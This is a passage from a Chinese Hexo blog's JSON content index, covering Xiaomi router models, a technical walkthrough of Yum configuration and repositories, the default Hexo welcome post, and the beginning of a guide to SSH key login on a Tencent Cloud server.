title=\"其他产品\"></a>其他产品</h3><ul>\n<li><strong>红米AX6S</strong>：MTK芯片的实验品，性能配置与红米AX6相当。黑色外套好区分，便宜20元。</li>\n<li><strong>红米电竞AX5400</strong>：红米AX5400的兄弟款，主打电竞市场的智商税；换个黑色外套和灯光，2个WAN口 + 2.5G的LAN口，但涨价200元。</li>\n<li><strong>小米AX3600</strong>：售价499元，曾经的性价比之王，已下架；替代品AX6000，将IPQ8071的CPU降档为IPQ5018，增加了几个然并L的智能家居、4*4 MIMO等功能，然后涨价100元！</li>\n<li><strong>红米AX6</strong>：CPU是IPQ8071，QCN5052+QCN5054的双无线芯片，配置模式很有AX9000的影子，可惜也下架了，少量存货加价300+</li>\n<li>其他早期下架产品还有：小米AX1800、红米AX1800、红米AX5等。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.acwifi.net/13681.html\">小米AX9000三频无线路由器拆机</a></li>\n<li><a href=\"https://www.acwifi.net/12621.html\">小米AX6000拆机，拆完后开不了机</a></li>\n<li><a href=\"https://www.acwifi.net/15091.html\">红米AX3000拆机</a></li>\n<li><a href=\"https://www.acwifi.net/10272.html\">红米AX5拆机，不用看了跟小米AX1800一样</a></li>\n<li><a href=\"https://www.acwifi.net/11176.html\">红米AX6拆机，旧款WIFI6无线路由器</a></li>\n<li><a href=\"https://www.10bests.com/wifi6-routers-by-chip-qualcomm/\">高通芯片方案的Wi-Fi6路由器汇总和推荐</a></li>\n</ul>\n<h3 id=\"视频教材\"><a href=\"#视频教材\" class=\"headerlink\" title=\"视频教材\"></a>视频教材</h3><ul>\n<li><a href=\"https://www.ixigua.com/6973629022425055781?logTag=8860c8362a7f51e7d691\">小米AX9000高端功能及性能评测</a></li>\n<li><a href=\"https://www.ixigua.com/6900819345442603524?id=6958306910969791012&logTag=0781892ee341492262db\">小米路由器AX9000 无线mesh组网评测</a></li>\n</ul>\n"},{"title":"Yum软件包管理器的技术分析","url":"/2020/06/27/Yum%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>YUM（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。它基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，无须繁琐地一次次下载、安装。</p>\n<p>yum 的理念是使用一个中心仓库(repository)管理一部分甚至一个distribution 的应用程序相互关系，根据计算出来的软件依赖关系进行相关的升级、安装、删除等等操作，减少了Linux 用户一直头痛的dependencies 的问题。这一点上，yum 和apt 相同。apt 原为debian 的deb 类型软件管理所使用，但是现在也能用到RedHat 门下的rpm 了。此外，由于yum是用python编写的，因此你会发现它和pip的功能非常相似，语法也非常一致！</p>\n<p>yum 的关键之处是要有可靠的repository，顾名思义，这是软件的仓库，它可以是http 或ftp 站点，也可以是本地软件池，但必须包含rpm 的header，header 包括了rpm 包的各种信息，包括描述，功能，提供的文件，依赖性等。正是收集了这些header 并加以分析，才能自动化地完成余下的任务。</p>\n<p>以Centos 7.8为例，yum软件包主要包含以下部分：</p>\n<ul>\n<li><code>/usr/bin/yum</code>          可执行程序</li>\n<li><code>/etc/yum.conf</code>         主配置文件</li>\n<li><code>/etc/yum.repos.d/</code>    REPO源文件配置目录</li>\n<li><code>/etc/yum/</code>             辅助配置文件目录</li>\n</ul>\n<h2 id=\"主配置文件-etc-yum-conf\"><a href=\"#主配置文件-etc-yum-conf\" class=\"headerlink\" title=\"主配置文件 &#x2F;etc&#x2F;yum.conf\"></a>主配置文件 &#x2F;etc&#x2F;yum.conf</h2><p>yum 的配置文件分为两部分：main 和repository</p>\n<p>main 部分定义了全局配置选项，整个yum 配置文件应该只有一个main, 常位于<code>/etc/yum.conf</code> 中,一般其中只包含main部分的配置选项。</p>\n<p>repository 部分定义了每个源&#x2F;服务器的具体配置，可以有一到多个。常位于<code>/etc/yum.repo.d</code>目录下的各文件中。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost yum.repos.d]<span class=\"comment\"># more /etc/yum.conf</span></span><br><span class=\"line\">[main]</span><br><span class=\"line\">cachedir=/var/cache/yum/<span class=\"variable\">$basearch</span>/<span class=\"variable\">$releasever</span></span><br><span class=\"line\"><span class=\"comment\"># yum 缓存的目录，yum 在此存储下载的rpm 包和数据库，默认设置为/var/cache/yum</span></span><br><span class=\"line\">keepcache=0</span><br><span class=\"line\"><span class=\"comment\"># 安装完成后是否保留软件包，0为不保留（默认为0），1为保留</span></span><br><span class=\"line\">debuglevel=2</span><br><span class=\"line\">logfile=/var/log/yum.log</span><br><span class=\"line\"><span class=\"comment\"># yum 日志文件位置。用户可以到/var/log/yum.log 文件去查询过去所做的更新</span></span><br><span class=\"line\">exactarch=1</span><br><span class=\"line\"><span class=\"comment\"># 如果设置为1，则yum 只会安装和系统架构匹配的软件包，例如，yum 不会将i686的软件包安装在适合i386的系统中。默认为1。</span></span><br><span class=\"line\">pkgpolicy=newest</span><br><span class=\"line\"><span class=\"comment\"># 包的策略。一共有两个选项，newest 和last，这个作用是如果你设置了多个repository，而同一软件在不同的repository 中同时存在，yum 应该安装哪一个，</span></span><br><span class=\"line\"><span class=\"comment\"># 如果是newest，则yum 会安装最新的那个版本。如果是last，则yum 会将服务器id 以字母表排序，并选择最后的那个服务器上的软件安装。一般都是选newest。</span></span><br><span class=\"line\">obsoletes=1</span><br><span class=\"line\"><span class=\"comment\"># 这是一个update 的参数，具体请参阅yum(8)，简单的说就是相当于upgrade，允许更新陈旧的RPM包。</span></span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\"><span class=\"comment\"># 有1和0两个选择，分别代表是否是否进行gpg(GNU Private Guard) 校验，以确定rpm 包的来源是有效和安全的。</span></span><br><span class=\"line\"><span class=\"comment\"># 这个选项如果设置在[main]部分，则对每个repository 都有效。默认值为0。</span></span><br><span class=\"line\">plugins=1</span><br><span class=\"line\"><span class=\"comment\"># 是否启用插件，默认1为允许，0表示不允许。我们一般会用yum-fastestmirror这个插件。</span></span><br><span class=\"line\">retries=6</span><br><span class=\"line\"><span class=\"comment\"># 网络连接发生错误后的重试次数，如果设为0，则会无限重试。默认值为6.</span></span><br><span class=\"line\">installonly_limit=5</span><br><span class=\"line\">bugtracker_url=http://bugs.centos.org/set_project.php?project_id=23&amp;ref=http://bugs.centos.org/bug_report_page.php?categ</span><br><span class=\"line\">ory=yum</span><br><span class=\"line\">distroverpkg=centos-release</span><br><span class=\"line\"><span class=\"comment\"># 指定一个软件包，yum 会根据这个包判断你的发行版本</span></span><br></pre></td></tr></table></figure>\n\n<p>distroverpkg字段定义了当前yum使用的基础包，这里指明是centos-release包，下面分析该包的版本信息</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost yum.repos.d]<span class=\"comment\"># rpm -qi centos-release</span></span><br><span class=\"line\">Name        : centos-release</span><br><span class=\"line\">Version     : 7</span><br><span class=\"line\"><span class=\"comment\"># 这里定义了发行版本号 $releasever，隐藏得很深啊！</span></span><br><span class=\"line\">Release     : 8.2003.0.el7.centos</span><br><span class=\"line\">Architecture: x86_64</span><br><span class=\"line\"><span class=\"comment\"># 这里定义了CPU基础架构 $basearch，隐藏得很深啊！</span></span><br><span class=\"line\">Install Date: 2020年06月25日 星期四 23时01分29秒</span><br><span class=\"line\">Group       : System Environment/Base</span><br><span class=\"line\">Size        : 43849</span><br><span class=\"line\">License     : GPLv2</span><br><span class=\"line\">Signature   : RSA/SHA256, 2020年04月14日 星期二 11时54分48秒, Key ID 24c6a8a7f4a80eb5</span><br><span class=\"line\">Source RPM  : centos-release-7-8.2003.0.el7.centos.src.rpm</span><br><span class=\"line\">Build Date  : 2020年04月07日 星期二 18时01分12秒</span><br><span class=\"line\">Build Host  : x86-01.bsys.centos.org</span><br><span class=\"line\">Relocations : (not relocatable)</span><br><span class=\"line\">Packager    : CentOS BuildSystem &lt;http://bugs.centos.org&gt;</span><br><span class=\"line\">Vendor      : CentOS</span><br><span class=\"line\">Summary     : CentOS Linux release file</span><br><span class=\"line\">Description :</span><br><span class=\"line\">CentOS Linux release files</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于预置变量的定义\"><a href=\"#关于预置变量的定义\" class=\"headerlink\" title=\"关于预置变量的定义\"></a>关于预置变量的定义</h3><p>REPO源文件中，经常用到的变量有：</p>\n<ul>\n<li><code>$releasever</code>：当前系统的发行版本号，例如 “7”</li>\n<li><code>$basearch</code>： 当前系统的CPU架构，例如“x86-64”</li>\n<li><code>$arch</code>： 类似<code>$basearch</code></li>\n<li><code>/etc/yum.conf</code> 中定义的各个变量。 由于yum是用Python写的，该配置文件中的变量均可以在repo定义中被引用</li>\n<li><code>/etc/yum/vars</code> 中各个文件包含的自定义变量，例如<code>$infra</code>等</li>\n</ul>\n<h2 id=\"REPO源配置文件目录-etc-yum-repos-d\"><a href=\"#REPO源配置文件目录-etc-yum-repos-d\" class=\"headerlink\" title=\"REPO源配置文件目录 &#x2F;etc&#x2F;yum.repos.d&#x2F;\"></a>REPO源配置文件目录 &#x2F;etc&#x2F;yum.repos.d&#x2F;</h2><p>repository 部分定义了每个源&#x2F;服务器的具体配置，可以有一到多个。常位于<code>/etc/yum.repo.d\\</code>目录下的各文件中。</p>\n<p><code>yum repolist</code>命令列出全部生效的源配置，具体判断逻辑是：</p>\n<ul>\n<li>寻找以下所有文件：<code>/etc/yum.repos.d/*.repo</code></li>\n<li>分析每个repo源文件中，找出所有<code>enabled=1</code>的源标识</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># tree /etc/yum.repos.d</span></span><br><span class=\"line\">yum.repos.d</span><br><span class=\"line\">├── CentOS-Base.repo</span><br><span class=\"line\">├── CentOS-CR.repo</span><br><span class=\"line\">├── CentOS-Debuginfo.repo</span><br><span class=\"line\">├── CentOS-Epel.repo</span><br><span class=\"line\">├── CentOS-fasttrack.repo</span><br><span class=\"line\">├── CentOS-Media.repo</span><br><span class=\"line\">├── CentOS-Sources.repo</span><br><span class=\"line\">├── CentOS-Vault.repo</span><br><span class=\"line\">└── docker-ce.repo</span><br><span class=\"line\"><span class=\"comment\"># 后缀名必须是repo，其他类型文件无效</span></span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM_0_17_centos ~]<span class=\"comment\"># yum repolist</span></span><br><span class=\"line\">已加载插件：fastestmirror, langpacks</span><br><span class=\"line\">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\">源标识                                              源名称                                                        状态</span><br><span class=\"line\">!docker-ce-stable/x86_64                            Docker CE Stable - x86_64                                         77</span><br><span class=\"line\">!epel/7/x86_64                                      EPEL <span class=\"keyword\">for</span> redhat/centos 7 - x86_64                             13,314</span><br><span class=\"line\">!extras/7/x86_64                                    Qcloud centos extras - x86_64                                    397</span><br><span class=\"line\">!os/7/x86_64                                        Qcloud centos os - x86_64                                     10,070</span><br><span class=\"line\">!updates/7/x86_64                                   Qcloud centos updates - x86_64                                   737</span><br><span class=\"line\">repolist: 24,595</span><br><span class=\"line\"><span class=\"comment\"># 源标识：repo文件中的段落名 / $releasever / $basearch</span></span><br><span class=\"line\"><span class=\"comment\"># 源名称：repo文件中的该段落的name - $basearch</span></span><br><span class=\"line\"><span class=\"comment\"># 状态：当前repo源仓库中的rpm包数量</span></span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM_0_17_centos ~]<span class=\"comment\"># cat /etc/yum.repos.d/CentOS-Base.repo</span></span><br><span class=\"line\"></span><br><span class=\"line\">[os]</span><br><span class=\"line\"><span class=\"comment\"># serverid 是用于区别各个不同的repository，必须有一个独一无二的名称，就是repo列表中显示的“”源标识“</span></span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">gpgkey=http://mirrors.tencentyun.com/centos/RPM-GPG-KEY-CentOS-7</span><br><span class=\"line\"><span class=\"comment\"># gpgcheck 定义是否校验GPG KEY；</span></span><br><span class=\"line\">enabled=1</span><br><span class=\"line\"><span class=\"comment\"># enable 定义该源标识是否生效，默认值是”1“</span></span><br><span class=\"line\">baseurl=http://mirrors.tencentyun.com/centos/<span class=\"variable\">$releasever</span>/os/<span class=\"variable\">$basearch</span>/</span><br><span class=\"line\"><span class=\"comment\"># baseurl 定义rpm包的寻址方式，具体解释见下文</span></span><br><span class=\"line\">name=Qcloud centos os - <span class=\"variable\">$basearch</span></span><br><span class=\"line\"><span class=\"comment\"># 定义列表中显示的“”源名称“</span></span><br><span class=\"line\">priority=2</span><br><span class=\"line\"><span class=\"comment\"># 顺序指令：priority=N （N为1到99的正整数，数值越小越优先）。注意：需要yum-priorities插件支持</span></span><br><span class=\"line\"><span class=\"comment\"># 一般配置[base], [addons], [updates], [extras] 的priority=1，[CentOSplus], [contrib] 的priority=2，其他第三的软件源为：priority=N （推荐N&gt;10）</span></span><br><span class=\"line\"></span><br><span class=\"line\">[updates]</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">[extras]</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于baseurl\"><a href=\"#关于baseurl\" class=\"headerlink\" title=\"关于baseurl\"></a>关于baseurl</h3><p>baseurl 支持的协议有 <code>http://</code> <code>ftp://</code> <code>file://</code> 三种。</p>\n<p>baseurl 后可以跟多个url，你可以自己改为速度比较快的镜像站，但baseurl 只能有一个，也就是说不能像如下格式：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">baseurl=url://server1/path/to/repository/</span><br><span class=\"line\">baseurl=url://server2/path/to/repository/</span><br><span class=\"line\">baseurl=url://server3/path/to/repository/</span><br></pre></td></tr></table></figure>\n\n<p>其中url 指向的目录必须是这个repository header 目录的上一级，它也支持<code>$releasever</code>, <code>$basearch</code> 这样的变量。<br>url 之后可以加上多个选项，如gpgcheck、exclude、failovermethod 等，比如：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">[updates-released]</span><br><span class=\"line\">name=Fedora Core $releasever - $basearch - Released Updates</span><br><span class=\"line\">baseurl=http://download.atrpms.net/mirrors/fedoracore/updates/$releasever/$basearch</span><br><span class=\"line\">　　　　 http://redhat.linux.ee/pub/fedora/linux/core/updates/$releasever/$basearch</span><br><span class=\"line\">　　　　 http://fr2.rpmfind.net/linux/fedora/core/updates/$releasever/$basearch</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">exclude=gaim</span><br><span class=\"line\">failovermethod=priority</span><br></pre></td></tr></table></figure>\n\n<p>其中gpgcheck，exclude 的含义和[main] 部分相同，但只对此服务器起作用.</p>\n<p>failovermethode 有两个选项roundrobin 和priority，意思分别是有多个url可供选择时，yum 选择的次序.</p>\n<ul>\n<li>roundrobin 是随机选择，如果连接失败则使用下一个，依次循环;</li>\n<li>priority 则根据url 的次序从第一个开始。如果不指明，默认是roundrobin。</li>\n</ul>\n<h3 id=\"关于mirrorlist\"><a href=\"#关于mirrorlist\" class=\"headerlink\" title=\"关于mirrorlist\"></a>关于mirrorlist</h3><p>baseurl是repo定义的核心内容，有时候也可以用mirrorlist代替，例如<br><code>mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra</code></p>\n<p>这个url地址用到了<code>$releasever</code>和<code>$basearch</code> 变量，而<code>$infra</code>是在<code>/etc/yum/vars/</code>目录中的自定义变量</p>\n<p>看看这个镜像url地址的返回内容，实际上就是几个可用的镜像url地址。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost yum.repos.d]<span class=\"comment\"># curl &quot;http://mirrorlist.centos.org/?release=7&amp;arch=x86_64&amp;repo=kernel&amp;infra=stock&quot;</span></span><br><span class=\"line\">http://mirrors.huaweicloud.com/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirrors.bfsu.edu.cn/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror-hk.koddos.net/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.worria.com/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.xtom.com.hk/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.aktkn.sg/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://ftp.yz.yamagata-u.ac.jp/pub/linux/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirrors.powernet.com.ru/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://mirror.hoster.kz/centos-altarch/7.8.2003/kernel/x86_64/</span><br><span class=\"line\">http://centosu7.centos.org/altarch/7.8.2003/kernel/x86_64/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"yum辅助配置文件目录-etc-yum\"><a href=\"#yum辅助配置文件目录-etc-yum\" class=\"headerlink\" title=\"yum辅助配置文件目录 &#x2F;etc&#x2F;yum&#x2F;\"></a>yum辅助配置文件目录 &#x2F;etc&#x2F;yum&#x2F;</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># tree /etc/yum</span></span><br><span class=\"line\">/etc/yum</span><br><span class=\"line\">├── fssnap.d</span><br><span class=\"line\">├── pluginconf.d                        <span class=\"comment\"># yum插件的配置文件目录</span></span><br><span class=\"line\">│   ├── fastestmirror.conf              <span class=\"comment\"># 默认的镜像测速插件，修改enabled值可以关闭该插件</span></span><br><span class=\"line\">│   └── langpacks.conf                  <span class=\"comment\"># 语言类的插件</span></span><br><span class=\"line\">├── protected.d</span><br><span class=\"line\">│   └── systemd.conf</span><br><span class=\"line\">├── vars                                <span class=\"comment\"># 自定义变量的配置文件目录</span></span><br><span class=\"line\">│   ├── contentdir</span><br><span class=\"line\">│   └── infra                           <span class=\"comment\"># mirrorlist示例中用到了这个自定义变量</span></span><br><span class=\"line\">└── version-groups.conf</span><br></pre></td></tr></table></figure>\n\n<p>目录&#x2F;etc&#x2F;yum&#x2F;vars&#x2F; 下的文件可以自定义变量，并通过$contentdir, $infra 在repo文件中引用</p>\n<h2 id=\"如何查看软件包的文件明细\"><a href=\"#如何查看软件包的文件明细\" class=\"headerlink\" title=\"如何查看软件包的文件明细\"></a>如何查看软件包的文件明细</h2><p>可以使用<code>repoquery</code>命令，可能需要安装<code>yum-utils</code>软件包，即：<code>yum install yum-utils</code><br>具体方法是：<code>repoquery -ql &lt;package-name&gt;</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@analyst cloudinit]# repoquery -ql chrony.x86_64</span><br><span class=\"line\">/etc/NetworkManager/dispatcher.d/20-chrony</span><br><span class=\"line\">/etc/chrony.conf</span><br><span class=\"line\">/etc/chrony.keys</span><br><span class=\"line\">/etc/dhcp/dhclient.d/chrony.sh</span><br><span class=\"line\">/etc/logrotate.d/chrony</span><br><span class=\"line\">/etc/sysconfig/chronyd</span><br><span class=\"line\">/usr/bin/chronyc</span><br><span class=\"line\">/usr/lib/systemd/ntp-units.d/50-chronyd.list</span><br><span class=\"line\">/usr/lib/systemd/system/chrony-dnssrv@.service</span><br><span class=\"line\">/usr/lib/systemd/system/chrony-dnssrv@.timer</span><br><span class=\"line\">/usr/lib/systemd/system/chrony-wait.service</span><br><span class=\"line\">/usr/lib/systemd/system/chronyd.service</span><br><span class=\"line\">/usr/libexec/chrony-helper</span><br><span class=\"line\">/usr/sbin/chronyd</span><br><span class=\"line\">/usr/share/doc/chrony-3.4</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/COPYING</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/FAQ</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/NEWS</span><br><span class=\"line\">/usr/share/doc/chrony-3.4/README</span><br><span class=\"line\">/usr/share/man/man1/chronyc.1.gz</span><br><span class=\"line\">/usr/share/man/man5/chrony.conf.5.gz</span><br><span class=\"line\">/usr/share/man/man8/chronyd.8.gz</span><br><span class=\"line\">/var/lib/chrony</span><br><span class=\"line\">/var/lib/chrony/drift</span><br><span class=\"line\">/var/lib/chrony/rtc</span><br><span class=\"line\">/var/log/chrony</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"如何创建内网的本地-YUM-源\"><a href=\"#如何创建内网的本地-YUM-源\" class=\"headerlink\" title=\"如何创建内网的本地 YUM 源\"></a>如何创建内网的本地 YUM 源</h2><p>可以参见<a href=\"https://www.jianshu.com/p/6c3090968d71\">Centos7通过reposync搭建本地Yum源</a>，其中关键是：</p>\n<ul>\n<li>通过<code>reposync</code>命令，将远程 RPM 资源库同步到本地磁盘</li>\n<li>通过<code>createrepo</code>命令，建立本地 YUM 源</li>\n<li>下载 KEY 文件，引入官方的 RPM GPG 公钥（可选）</li>\n<li>建立 Nginx 文件服务器，启动 http 服务</li>\n</ul>\n<p>注意！openEuler 等发行版不使用 yum-utils 工具包，而是直接使用 dnf 工具包，参数格式可能有所差异！！！</p>\n<hr>\n<h2 id=\"解决yum软件依赖的有效方法\"><a href=\"#解决yum软件依赖的有效方法\" class=\"headerlink\" title=\"解决yum软件依赖的有效方法\"></a>解决yum软件依赖的有效方法</h2><p>若安装失败，并提示缺少依赖，如提示<code>can not find libXss.so.1 libappindicator3.so.1</code>，可先获取依赖包信息 查询命令：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">repoquery --nvr --whatprovides libXss.so.1</span><br><span class=\"line\">repoquery --nvr --whatprovides libappindicator3.so.1</span><br></pre></td></tr></table></figure>\n\n<p>查询repoquery的输出结果 ,找到该文件所在的软件包，例如<code>libXScrnSaver-1.2.2-6.1.el7</code><br>立即安装该依赖软件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install libXScrnSaver*</span><br><span class=\"line\">yum install libappindicator*</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录-Using-Yum-Variables\"><a href=\"#附录-Using-Yum-Variables\" class=\"headerlink\" title=\"附录: Using Yum Variables\"></a>附录: Using Yum Variables</h2><p>You can use and reference the following built-in variables inyum commands and in all Yum configuration files (that is,&#x2F;etc&#x2F;yum.conf and all .repo files in the &#x2F;etc&#x2F;yum.repos.d&#x2F;directory):</p>\n<h3 id=\"releasever\"><a href=\"#releasever\" class=\"headerlink\" title=\"$releasever\"></a>$releasever</h3><p>You can use this variable to reference the release version of Red Hat Enterprise Linux. Yum obtains the value of $releasever from the distroverpkg&#x3D;value line in the &#x2F;etc&#x2F;yum.conf configuration file.<br>If there is no such linein &#x2F;etc&#x2F;yum.conf, then yum infers the correct value by deriving theversion number from the redhat-release package.</p>\n<h3 id=\"arch\"><a href=\"#arch\" class=\"headerlink\" title=\"$arch\"></a>$arch</h3><p>You can use this variable to refer to the system’s CPU architecture as returned when calling Python’s os.uname() function.Valid values for $arch include: i586, i686 and x86_64.</p>\n<h3 id=\"basearch\"><a href=\"#basearch\" class=\"headerlink\" title=\"$basearch\"></a>$basearch</h3><p>You can use $basearch to reference the base architecture of the system.<br>For example, i686 and i586 machines both have a base architecture of i386, and AMD64 and Intel64 machines have a base architecture of x86_64.</p>\n<h3 id=\"YUM0-9\"><a href=\"#YUM0-9\" class=\"headerlink\" title=\"$YUM0-9\"></a>$YUM0-9</h3><p>These ten variables are each replaced with the value of anyshell environment variables with the same name.</p>\n<p>If one of the sevariables is referenced (in &#x2F;etc&#x2F;yum.conf for example) and a shell environment variable with the same name does not exist, then the configuration file variable is not replaced.</p>\n<p>To define a custom variable or to override the value of anexisting one, create a file with the same name as the variable(without the “$” sign) in the &#x2F;etc&#x2F;yum&#x2F;vars&#x2F; directory, and add the desired value on its first line.</p>\n<p>For example, repository descriptions often include the operating system name. To define a new variable called $osname,create a new file with “Red Hat Enterprise Linux” on the first lineand save it as <code>/etc/yum/vars/osname:</code></p>\n<p><code># echo “Red Hat Enterprise Linux” &gt;/etc/yum/vars/osname</code></p>\n<p>Instead of “Red Hat Enterprise Linux 6”, you can now use the following in the .repo files: <code>name=$osname $releasever</code></p>\n"},{"title":"Hello World","url":"/2018/12/21/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\">Deployment</a></p>\n","tags":["hexo","default"]},{"title":"为ECS设置ssh密钥登录的方法","url":"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>最近，租用的腾讯云服务器ECS中招了，来自伦敦IDC的黑客通过ssh访问暴力破解root密码，并种上了木马（估计是挖矿的），看来必须重视安全加固工作了。<br>ECS开放了80和443端口提供http和https服务，维护用的ssh端口22也是必须的。虽然可以为root设置更加复杂的密码，但也是给自己找麻烦，想来想去，最好还是取消ssh的密码登录方式，改为密钥登录方式，具体的操作步骤如下：</p>\n<h2 id=\"在腾讯云上，配置ECS采用ssh密钥登录方式\"><a href=\"#在腾讯云上，配置ECS采用ssh密钥登录方式\" class=\"headerlink\" title=\"在腾讯云上，配置ECS采用ssh密钥登录方式\"></a>在腾讯云上，配置ECS采用ssh密钥登录方式</h2><ol>\n<li><p>登录腾讯云，并转到ECS控制台。<strong>注意：为保障安全，ECS在关机状态才能修改登录方式！</strong></p>\n</li>\n<li><p>选择<code>SSH密钥</code>-<code>创建密钥</code>，在弹出式窗口中选择<code>创建新密钥对</code>，并按提示进行操作。</p>\n<blockquote>\n<p>弹窗中的<code>使用已有公钥</code>按钮，其功能是：导入用户自己手工产生的公钥文件</p>\n</blockquote>\n <img src=\"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/ecs-1.png\" class=\"\">\n</li>\n<li><p>根据提示信息下载私钥文件,注意自行妥善保存。默认文件后缀名为.dms，可以改为.txt。</p>\n</li>\n<li><p>将新生成的密钥对与需要的ECS进行绑定。<strong>绑定ECS成功后，ECS就不再支持密码登录了</strong></p>\n<blockquote>\n<p>屏幕显示的公钥内容ssa-rsa，其实就是ECS服务器上<code>$HOME/.ssh/authorized_keys</code>的内容</p>\n</blockquote>\n <img src=\"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/ecs-2.png\" class=\"\"></li>\n</ol>\n<h2 id=\"调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）\"><a href=\"#调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）\" class=\"headerlink\" title=\"调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）\"></a>调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）</h2><p>基本步骤是：</p>\n<ol>\n<li><p>Mac OS 用户请打开系统自带的终端（Terminal）并输入以下命令，<strong>赋予私钥文件仅本人可读权限（必须设置！）</strong>。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 400 <span class=\"variable\">$HOME</span>/Downloads/TENCENT_ECS.txt</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在Terminal窗口中执行以下命令，进行远程登录。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -i <span 